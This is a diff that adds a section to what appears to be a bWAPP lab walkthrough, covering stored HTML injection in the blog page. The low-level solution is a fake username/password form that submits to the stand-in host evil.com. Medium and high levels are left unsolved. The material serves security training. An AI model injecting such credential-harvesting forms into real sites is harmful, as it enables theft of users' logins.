@@ -38,7 +38,20 @@ Below are the html form tags that should be entered in the username.
  
     I haven't done this as it wont run on Firefox only compatible version is of IE. Niether Chromium,Chrome nor Firefox would work.Look [here](http://penthusiasts.blogspot.com/2013/12/bwapp-html-injection-all.html) for methods.
     
-  
+## HTML Injection - Stored (Blog)
+
+- Security Level : Low
+    ```
+    <form action="https://evil.com">
+    <input type="text" placeholder="Username"></br></br>
+    <input type="password" placeholder="Password"></br></br>
+    <input type="submit" value="Submit">
+    </form>
+    ```
+- Security-Level : Medium/High
+
+    Can't solve this one. If you know the solution please make PR.
+    
 # A8 - Cross Site Request Forgery(CSRF)
 Below are the POC html pages. Open them in your server and click on button to perform the attack
 
